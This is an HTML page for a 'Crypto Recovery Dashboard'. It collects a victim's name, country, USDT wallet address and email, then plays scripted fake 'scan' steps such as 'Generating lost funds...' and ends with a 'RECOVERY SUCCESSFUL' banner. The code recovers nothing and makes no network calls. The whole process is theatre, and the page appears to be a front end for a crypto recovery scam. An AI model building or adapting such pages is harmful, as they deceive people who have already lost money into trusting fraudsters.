<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Crypto Recovery Dashboard</title>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background-color: #0b0f1a;
      color: #fff;
    }

    .container {
      max-width: 400px;
      margin: 60px auto;
      padding: 20px;
      background-color: #131722;
      border-radius: 12px;
      box-shadow: 0 0 20px rgba(255, 255, 255, 0.05);
    }

    h2 {
      text-align: center;
      color: #f0b90b;
    }

    input, select, button {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: none;
      border-radius: 6px;
      font-size: 1em;
    }

    input, select {
      background-color: #1e2633;
      color: #fff;
    }

    button {
      background-color: #f0b90b;
      color: #000;
      font-weight: bold;
      cursor: pointer;
    }

    button:disabled {
      background-color: #999;
      cursor: not-allowed;
    }

    .hidden {
      display: none;
    }

    .activity {
      margin: 20px 0;
      font-size: 1.1em;
      text-align: center;
    }

    .scan-step {
      margin: 10px 0;
      padding: 10px;
      background-color: #1e2633;
      border-radius: 6px;
      font-size: 0.95em;
    }

    .success {
      color: #00ffcc;
      font-weight: bold;
      text-align: center;
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <div class="container" id="registration">
    <h2>Recovery Registration</h2>
    <select id="country">
      <option value="">Select Country</option>
      <option value="USA">USA</option>
      <option value="UK">UK</option>
      <option value="Nigeria">Nigeria</option>
    </select>
    <input type="text" id="name" placeholder="Full Name" />
    <input type="text" id="usdt" placeholder="USDT Address" />
    <input type="email" id="email" placeholder="Email Address" />
    <button onclick="register()">Submit</button>
  </div>

  <div class="container hidden" id="dashboard">
    <h2>Welcome Back</h2>
    <div class="activity" id="greeting"></div>
    <button onclick="startRecovery()">Click to Complete Recovery</button>
    <div id="scanSteps" class="hidden"></div>
    <div id="finalMessage" class="success hidden">🎉 CONGRATULATIONS RECOVERY SUCCESSFUL</div>
  </div>

  <script>
    const registrationDiv = document.getElementById('registration');
    const dashboardDiv = document.getElementById('dashboard');
    const greeting = document.getElementById('greeting');
    const scanSteps = document.getElementById('scanSteps');
    const finalMessage = document.getElementById('finalMessage');

    const steps = [
      "• Checking past activities...",
      "• Generating lost funds...",
      "• Loading database...",
      "• Refreshing new info...",
      "• Posting user profile to Blockchain...",
      "• Selecting crypto for payout...",
      "• BITCOIN SELECTED ✅",
      "• Completing scanning details...",
      "• Completing user recovery..."
    ];

    let username = "";

    if (localStorage.getItem('registered')) {
      username = localStorage.getItem('name');
      showDashboard();
    }

    function register() {
      const country = document.getElementById('country').value;
      username = document.getElementById('name').value;
      const usdt = document.getElementById('usdt').value;
      const email = document.getElementById('email').value;

      if (!country || !username || !usdt || !email) {
        alert("Please fill all fields.");
        return;
      }

      localStorage.setItem('registered', true);
      localStorage.setItem('name', username);
      showDashboard();
    }

    function showDashboard() {
      registrationDiv.classList.add('hidden');
      dashboardDiv.classList.remove('hidden');
      greeting.textContent = `Dear ${username}, you have 1 ongoing activity`;
    }

    function startRecovery() {
      scanSteps.classList.remove('hidden');
      scanSteps.innerHTML = "";
      let index = 0;

      const interval = setInterval(() => {
        if (index < steps.length) {
          const step = document.createElement('div');
          step.className = 'scan-step';
          step.textContent = steps[index];
          scanSteps.appendChild(step);
          index++;
        } else {
          clearInterval(interval);
          finalMessage.classList.remove('hidden');
        }
      }, 1000);
    }
  </script>
</body>
</html>
